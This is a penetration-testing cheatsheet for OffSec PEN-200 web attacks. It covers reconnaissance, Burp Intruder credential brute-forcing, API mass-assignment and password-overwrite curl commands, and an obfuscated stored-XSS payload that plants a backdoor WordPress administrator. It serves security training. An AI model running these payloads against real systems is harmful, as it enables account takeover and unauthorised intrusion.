# OffSec PEN-200 Web Application Attacks Cheatsheet

A tactical reference guide for web application reconnaissance, enumeration, API manipulation, and client-side privilege escalation during penetration testing engagements.

---

## 1. Web Application Assessment Methodologies and Scoping

Security assessments require defining the rules of engagement and the level of internal knowledge granted to the tester. Testing methodologies dictate how resources are allocated across reconnaissance, enumeration, and direct exploitation.

### Assessment Approaches Comparison

Understanding the operational boundaries of each testing model ensures proper allocation of time during lab exercises and practical exam scenarios.

| Assessment Model | Knowledge Level | Access Scope | Operational Focus | Typical Scenario |
| :--- | :--- | :--- | :--- | :--- |
| **Black-Box Testing** | Zero knowledge | No internal documentation or credentials provided | Heavy reconnaissance and automated/manual enumeration | External penetration tests, bug bounty programs, and OSCP practical labs |
| **Grey-Box Testing** | Partial knowledge | Specific credentials, role definitions, or framework details | Targeted privilege boundaries and authenticated logic flaws | Typical commercial security assessments with defined user roles |
| **White-Box Testing** | Full knowledge | Complete source code, architectural schemas, and infrastructure access | Comprehensive source code review, logic audits, and configuration analysis | Deep software security audits and internal product pre-release reviews |

### The OWASP Top 10 Framework

Web applications frequently incorporate multi-tiered architectures, legacy third-party dependencies, and complex custom business logic. The Open Web Application Security Project (OWASP) Top 10 serves as the primary industry baseline for identifying critical security flaws, ranging from broken access controls and injection vulnerabilities to security misconfigurations. Mastering baseline reconnaissance and vulnerability verification techniques forms the foundation for chaining these flaws into complete host compromise.

---

## 2. Reconnaissance and Infrastructure Fingerprinting

Effective web assessments begin by mapping the underlying operating system, web daemon, active frameworks, and application routing architectures.

### Active Service Fingerprinting with Nmap

Direct port scanning verifies listening HTTP services, while service detection flags the server banner and daemon version to highlight outdated or vulnerable software.

```bash
# Web server banner and service version enumeration on port 80
sudo nmap -p80 -sV <TARGET_IP>
```

Service-specific Nmap Scripting Engine (NSE) scripts rapidly probe common web paths, default directories, and known administrative entry points.

```bash
# Automated directory and file enumeration via http-enum
sudo nmap -p80 --script=http-enum <TARGET_IP>
```

### Passive Technology Stack Discovery

Identifying server-side frameworks and client-side libraries guides the selection of targeted exploit payloads and known CVE research.

*   **Wappalyzer**: Evaluates HTML element signatures, script inclusions, and header patterns to passively identify web servers, operating systems, user interface frameworks, and JavaScript libraries such as jQuery. Specific library versions reveal known client-side and server-side weaknesses.
*   **HTTP Response Header Analysis**: Inspected via browser network consoles or proxy histories to reveal hosting environments. Standard and non-standard headers include:
    *   `Server`: Direct identification of the web daemon (e.g., Apache/2.4.41, Werkzeug/1.0.1 Python/3.7.13).
    *   `X-Powered-By`: Server-side programming language or framework runtimes (e.g., PHP, ASP.NET).
    *   `x-amz-cf-id`: Indicates reverse proxying or content delivery through Amazon CloudFront.
    *   `X-Aspnet-Version`: Explicit versioning of underlying Microsoft .NET frameworks.
    *   `X-Forwarded-For`: Injected by intermediary proxies to record the originating client IP address.

### Web Crawler Directives

Webmasters utilize crawler instruction files to regulate search engine indexing. These files frequently leak administrative directories, database backups, and unlinked endpoints.

```bash
# Retrieve and examine crawler exclusion directives
curl -i http://<TARGET_IP>/robots.txt
```

Inspection focuses on `Disallow` directives targeting administrative consoles, backup directories, database dumps, and developer portals. Supplemental sitemap files defined under the sitemaps protocol similarly expose full resource listings.

---

## 3. Directory and Endpoint Discovery with Gobuster

Mapping an application's hidden directory structure and private resources requires high-speed dictionary brute forcing against HTTP status codes.

### Standard Directory Brute-Forcing

Gobuster running in directory mode (`dir`) systematically evaluates wordlists against the target URI. Concurrency control prevents service instability or network connection drops.

```bash
# Directory and file discovery using a standardized wordlist
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/common.txt -t 5
```

Key execution flags include:
*   `-u`: Specifies the target base URL, including protocol and port.
*   `-w`: Designates the wordlist path (such as `/usr/share/wordlists/dirb/common.txt` or `big.txt`).
*   `-t`: Restricts concurrent threads (defaults to 10; lowering to 5 reduces bandwidth and prevents rate-limiting).

HTTP status codes guide further action:
*   `200 OK`: Resource directly accessible.
*   `301 Moved Permanently` / `302 Found`: Directory redirection, requiring trailing slash inspection.
*   `403 Forbidden`: Resource exists but enforces restricted access permissions.

### Pattern-Based API Endpoint Enumeration

REST APIs commonly follow structured naming conventions incorporating functional descriptions and version numbers (e.g., `/api_name/v1`). Gobuster's pattern engine appends custom suffixes to wordlist entries dynamically.

1.  Create a local pattern definition file named `pattern`:
    ```text
    {GOBUSTER}/v1
    {GOBUSTER}/v2
    ```
2.  Execute Gobuster using the `-p` pattern switch:
    ```bash
    gobuster dir -u http://<TARGET_IP>:<PORT> -w /usr/share/wordlists/dirb/big.txt -p pattern
    ```
3.  Recursively brute-force discovered endpoint hierarchies:
    ```bash
    gobuster dir -u http://<TARGET_IP>:<PORT>/users/v1/admin/ -w /usr/share/wordlists/dirb/small.txt
    ```

---

## 4. Burp Suite Tactical Configuration and Workflow

Burp Suite operates as an intercepting HTTP proxy, positioned between the tester's browser and the target server, granting precise control over requests and responses.

### Environment Setup and Optimization

Proper configuration ensures clean interception without extraneous network noise or broken application routing.

1.  **Proxy Listener Verification**:
    Ensure the Burp Proxy listener is active under **Proxy > Options**, listening on loopback interface `127.0.0.1:8080`.
2.  **Firefox Manual Proxy Configuration**:
    Navigate to `about:preferences#general`, access **Network Settings**, select **Manual proxy configuration**, and set both HTTP and HTTPS proxies to `127.0.0.1` on port `8080`.
3.  **Captive Portal Noise Suppression**:
    To eliminate continuous background requests to `detectportal.firefox.com`, navigate to `about:config` in Firefox and set `network.captive-portal-service.enabled` to `false`.
4.  **Static Host Resolution**:
    Web applications that rely on domain-based routing or redirect to internal hostnames fail without local name resolution. Map the target IP and hostname manually in `/etc/hosts`:
    ```bash
    echo "<TARGET_IP> <HOSTNAME>" | sudo tee -a /etc/hosts
    ```

### Core Toolsets and Application Flow

The modular architecture of Burp Suite enables seamless promotion of requests across specialized assessment tools.

| Tool Component | Primary Function | Operational Workflow |
| :--- | :--- | :--- |
| **Proxy** | Traffic interception and inspection | Toggle `Intercept is on/off` under the Intercept tab. Inspect complete request/response exchanges within `HTTP history`. |
| **Repeater** | Manual request modification and replay | Highlight requests in `HTTP history`, right-click and select `Send to Repeater`. Adjust parameters, headers, or verbs and click `Send`. |
| **Intruder** | Automated payload injection and fuzzing | Right-click request to `Send to Intruder`. Define positions under `Positions`, configure payloads under `Payloads`, and click `Start Attack`. |
| **Target Site Map** | Structural application mapping | Visual tree representation of all observed paths, parameters, and endpoints for organized vulnerability tracking. |

### Automated Credential Brute-Forcing with Intruder

Intruder automates credential fuzzing against authentication endpoints.

1.  Capture a failed login request (e.g., `POST /wp-login.php`) in **Proxy > HTTP history**.
2.  Transfer the transaction to Intruder via `Send to Intruder`.
3.  Under the **Positions** tab, click **Clear** to remove automatic markers, highlight the target credential value (e.g., the value of parameter `pwd`), and click **Add** to place payload position markers around it.
4.  Under the **Payloads** tab, configure **Payload Options [Simple list]** by pasting or loading a wordlist (such as the top entries of `/usr/share/wordlists/rockyou.txt`).
5.  Execute via **Start Attack** and analyze the results grid: sort by HTTP response code or response length to identify anomalies indicating successful authentication (such as a `302 Found` redirection).

---

## 5. REST API Analysis and Broken Object-Level Logic Exploitation

Application Programming Interfaces (APIs) commonly enforce business logic on the back end. Improper input validation and insecure parameter handling expose critical administrative vectors.

### API Method Probing and Error Analysis

APIs enforce specific HTTP verbs. Evaluating server error responses differentiates between nonexistent endpoints and unsupported request methods.

*   `404 Not Found`: Endpoint does not exist, or the routing path is invalid.
*   `405 Method Not Allowed`: Endpoint exists, but the supplied HTTP verb (e.g., `GET`) is rejected. Indicates that alternative verbs (`POST`, `PUT`, `DELETE`, `PATCH`) must be probed.

Probing login endpoints with invalid credentials confirms routing viability:

```bash
# Probing login endpoints with structured JSON data
curl -i -d '{"username":"admin","password":"fake"}' \
  -H 'Content-Type: application/json' \
  http://<TARGET_IP>:<PORT>/users/v1/login
```

A response returning `{"status": "fail", "message": "Password is not correct for the given username."}` confirms both the endpoint's active processing and the validity of the username `admin`.

### Mass Assignment and Unauthorized Privilege Escalation

Flawed registration routines that fail to filter incoming JSON parameters can allow unauthorized elevation during account creation.

```bash
# Injecting unauthorized administrative attributes during registration
curl -i -d '{"username":"offsec","password":"lab","email":"pwn@offsec.com","admin":"True"}' \
  -H 'Content-Type: application/json' \
  http://<TARGET_IP>:<PORT>/users/v1/register
```

Upon receiving a successful registration response, authenticate using the newly created administrative account to acquire an authorization token:

```bash
# Authenticating to obtain a JSON Web Token (JWT)
curl -i -d '{"username":"offsec","password":"lab"}' \
  -H 'Content-Type: application/json' \
  http://<TARGET_IP>:<PORT>/users/v1/login
```

### Password Overwrite via HTTP Verb Tampering

Armed with an administrative JSON Web Token (JWT), testers can overwrite credentials across other accounts by switching request methods from `GET` or `POST` to `PUT`.

```bash
# Overwriting target user password using PUT and an OAuth authorization token
curl -X 'PUT' 'http://<TARGET_IP>:<PORT>/users/v1/admin/password' \
  -H 'Content-Type: application/json' \
  -H 'Authorization: OAuth <JWT_TOKEN>' \
  -d '{"password": "pwned"}' \
  --proxy 127.0.0.1:8080
```

Validating the takeover involves logging in directly as the target `admin` user using the newly forced credential:

```bash
# Verifying credential overwrite
curl -i -d '{"username":"admin","password":"pwned"}' \
  -H 'Content-Type: application/json' \
  http://<TARGET_IP>:<PORT>/users/v1/login
```

---

## 6. Cross-Site Scripting (XSS) Identification and Weaponization

Cross-Site Scripting (XSS) occurs when applications incorporate untrusted, unsanitized user input directly into dynamic web content rendered by client browsers.

### XSS Vulnerability Classifications

The execution context and persistence mechanism define the vulnerability's impact and scope.

*   **Stored (Persistent) XSS**: The malicious script payload is stored persistently within the application backend (e.g., database records, visitor logs, comment fields). The payload executes within the browser of any user who subsequently loads the compromised record, presenting a severe risk of administrative compromise.
*   **Reflected XSS**: The payload is embedded within a specific HTTP request (e.g., query strings, error parameters) and reflected immediately by the server in the response page. Requires social engineering to induce victims to follow crafted links.
*   **DOM-Based XSS**: The vulnerability resides entirely within client-side code where JavaScript reads from a controllable source (such as `location.hash`) and writes to a dangerous sink (such as `innerHTML` or `document.write`), executing without necessarily modifying server responses.

### Special Character Boundary Testing

Locating XSS injection points requires submitting characters that carry syntactic meaning in HTML and JavaScript contexts to assess filtering and encoding behaviors.

```text
< > ' " { } ;
```

*   `<` and `>`: Delimit HTML elements and tags (`<script>`, `<img>`).
*   `'` and `"`: Delimit string literals within HTML attributes or JavaScript statements.
*   `{` and `}`: Define JavaScript functions, control structures, and object blocks.
*   `;`: Terminates JavaScript statements.

Encoding behaviors dictate exploitation feasibility:
*   **HTML Encoding**: Converts characters to entity references (e.g., `<` becomes `&lt;`). Browsers display the literal glyph rather than parsing it as markup.
*   **URL (Percent) Encoding**: Converts characters to hexadecimal format for transmission (e.g., space becomes `%20`).

### Session Security Boundaries

When considering session theft via JavaScript (`document.cookie`), cookie flags dictate feasibility:
*   `HttpOnly`: Explicitly blocks client-side scripts from accessing the cookie, preventing direct credential theft via XSS.
*   `Secure`: Mandates that the browser transmit the cookie exclusively over encrypted TLS/HTTPS connections.

---

## 7. Advanced Stored XSS and Administrative Privilege Escalation

When `HttpOnly` flags prevent direct session cookie theft, Stored XSS can be weaponized into a dynamic client-side exploit that leverages the victim administrator's active session to perform administrative actions.

### Persistent Header Injection

Application analytics, logging modules, and visitor trackers frequently record HTTP headers into database backends without adequate sanitization, rendering them vulnerable to Stored XSS.

```bash
# Injecting proof-of-concept alert payload via HTTP User-Agent header
curl -i http://<TARGET_IP>/ --user-agent "<script>alert(42)</script>"
```

### Chained Exploit: Dynamic CSRF Nonce Extraction and User Provisioning

Web applications implement cryptographic nonces to mitigate Cross-Site Request Forgery (CSRF). Because Stored XSS executes directly within the origin of the target application, injected scripts can circumvent CSRF protections by dynamically reading the required anti-CSRF token from the application DOM before dispatching forged requests.

```javascript
// Step 1: Issue synchronous request to administrative user creation page to extract CSRF nonce
var ajaxRequest = new XMLHttpRequest();
var requestURL = "/wp-admin/user-new.php";
var nonceRegex = /ser" value="([^"]*?)"/g;
ajaxRequest.open("GET", requestURL, false);
ajaxRequest.send();
var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);
var nonce = nonceMatch[1];

// Step 2: Construct administrative creation parameters embedding the extracted nonce
var params = "action=createuser&_wpnonce_create-user=" + nonce + "&user_login=attacker&email=attacker@offsec.com&pass1=attackerpass&pass2=attackerpass&role=administrator";

// Step 3: Dispatch asynchronous POST request to provision a new administrator account
ajaxRequest = new XMLHttpRequest();
ajaxRequest.open("POST", requestURL, true);
ajaxRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
ajaxRequest.send(params);
```

### Payload Transformation and Delivery Pipeline

To ensure the multi-line exploit passes cleanly through network transports and database storage routines without syntax termination or character corruption, the payload undergoes compression and character-code encoding.

#### 1. Code Minification
The raw JavaScript code is compressed into a single line to eliminate newlines and redundant whitespace.

#### 2. Character Code Serialization
A browser console utility converts the minified script string into an array of UTF-16 integer character codes using `charCodeAt()`:

```javascript
function encode_to_javascript(string) {
    var input = string;
    var output = '';
    for(var pos = 0; pos < input.length; pos++) {
        output += input.charCodeAt(pos);
        if(pos != (input.length - 1)) {
            output += ",";
        }
    }
    return output;
}

// Execute in developer console:
let encoded = encode_to_javascript('/* Minified JavaScript payload */');
console.log(encoded);
```

#### 3. Execution via `eval(String.fromCharCode(...))`
The generated integer sequence is reconstituted dynamically at runtime using `String.fromCharCode()` and executed via `eval()`. The complete weaponized payload is delivered through the vulnerable header:

```bash
curl -i http://<TARGET_IP>/ \
  --user-agent "<script>eval(String.fromCharCode(<COMMA_SEPARATED_INTEGER_ARRAY>))</script>" \
  --proxy 127.0.0.1:8080
```

When an authenticated administrator views the compromised log dashboard, the browser parses the script, dynamically extracts a valid anti-CSRF token, and provisions the backdoored administrative account (`attacker` / `attackerpass`).
